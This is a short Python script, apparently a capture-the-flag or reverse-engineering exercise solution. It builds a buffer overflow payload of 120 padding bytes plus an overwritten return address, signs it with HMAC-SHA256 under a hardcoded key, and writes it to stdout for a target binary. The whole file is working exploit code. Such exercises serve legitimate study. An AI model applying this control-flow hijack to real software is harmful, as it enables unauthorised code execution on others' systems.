#!/usr/bin/env python3
import sys
import hmac
import hashlib
blinkTheLightsAddress = 0x000000000040167a
hex1 = 0x950785cba7a9e428
hex2 = 0xcf37d5b64c524b53
hex3 = 0x583f01dd81d0e46e
hex4 = 0xaa8803ad7353520c
padAmount = 120
payload = padAmount * b'A' + blinkTheLightsAddress.to_bytes(8,'little')
doorKey = hex1.to_bytes(8,'little') +  hex2.to_bytes(8,'little') + hex3.to_bytes(8,'little') + hex4.to_bytes(8,'little') 
myHash= hmac.new(doorKey, payload, hashlib.sha256)
val_bytes = bytearray(myHash.digest())
stringtest = 'ghidrarocks'
sys.stdout.buffer.write((len(payload)).to_bytes(8,'little') + payload + val_bytes)
